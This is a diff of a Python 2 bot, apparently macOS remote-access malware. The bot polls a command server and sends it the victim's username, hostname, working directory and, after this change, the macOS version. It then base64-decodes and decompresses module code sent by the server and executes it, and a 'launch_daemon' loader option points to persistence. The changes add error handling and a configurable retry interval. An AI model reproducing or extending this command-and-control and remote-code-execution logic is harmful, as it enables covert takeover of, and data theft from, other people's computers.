@@ -3,7 +3,7 @@
 """Minimal bot which loads modules as they are needed from the server."""
 __author__ = "Marten4n6"
 __license__ = "GPLv3"
-__version__ = "4.0.1"
+__version__ = "4.1.1"
 
 import getpass
 import json
@@ -17,9 +17,11 @@ from base64 import b64encode, b64decode
 from binascii import hexlify
 from time import sleep, time
 from zlib import decompress
+import platform
 from StringIO import StringIO
 from urllib import urlencode
 import sys
+import binascii
 
 import urllib2
 
@@ -35,6 +37,7 @@ LOADER_OPTIONS = {"loader_name": "launch_daemon"}
 COMMAND_INTERVAL = 1  # Normal interval to check for commands.
 IDLE_INTERVAL = 30  # Interval to check for commands when idle.
 IDLE_TIME = 60  # Time in seconds after which the client will become idle.
+IDLE_SLEEP_INTERVAL = 5 # Time between sleeps
 
 # Logging
 logging.basicConfig(format="[%(levelname)s] %(funcName)s:%(lineno)s - %(message)s", level=logging.DEBUG)
@@ -149,7 +152,11 @@ class ModuleTask(Thread):
         sys.settrace(self.global_trace)
 
         # The module code is encoded with base64 and compressed.
-        module = compile(decompress(b64decode(self._command.command)), "<string>", "exec")
+        try:
+            module = compile(decompress(b64decode(self._command.command)), "<string>", "exec")
+        except binascii.Error:
+            send_response("Could not decode string as Base64 (len:%s).\n" % len(self._command.command))
+
         module_dict = {}
 
         # We want every module to be able to access these options.
@@ -159,7 +166,7 @@ class ModuleTask(Thread):
         self._command.options["loader_options"] = LOADER_OPTIONS
 
         try:
-            exec module in module_dict
+            exec(module, module_dict)
             module_dict["run"](self._command.options)  # Thanks http://lucumr.pocoo.org/2011/2/1/exec-in-python/
         except Exception:
             send_response("Error executing module: \n" + traceback.format_exc())
@@ -174,7 +181,7 @@ class ModuleTask(Thread):
 
     def local_trace(self, frame, why, arg):
         if self._is_killed:
-            if why == "line":
+            if why.strip() == "line":
                 raise SystemExit()
         return self.local_trace
 
@@ -217,7 +224,7 @@ def get_command():
                   b64encode(json.dumps({
                       "type": RequestType.GET_COMMAND, "username": run_command("whoami"),
                       "hostname": run_command("hostname"), "path": run_command("pwd"),
-                      "loader_name": LOADER_OPTIONS["loader_name"]
+                      "version": str(platform.mac_ver()[0]), "loader_name": LOADER_OPTIONS["loader_name"]
         }))
     }
     response = ""
@@ -235,7 +242,10 @@ def get_command():
 
     try:
         processed = response.split("DEBUG:\n")[1].replace("DEBUG-->", "")
-        processed_split = b64decode(processed).split("\n")
+        try:
+            processed_split = b64decode(processed).split("\n")
+        except binascii.Error:
+            return Command(CommandType.NONE)
 
         command_type = int(processed_split[0])
         command = processed_split[1]
@@ -296,10 +306,10 @@ def main():
             if "Connection refused" in str(ex):
                 # The server is offline.
                 log.error("Failed to connect to the server.")
-                sleep(5)
+                sleep(IDLE_SLEEP_INTERVAL)
             else:
                 log.error(traceback.format_exc())
-                sleep(5)
+                sleep(IDLE_SLEEP_INTERVAL)
 
 
 if __name__ == '__main__':
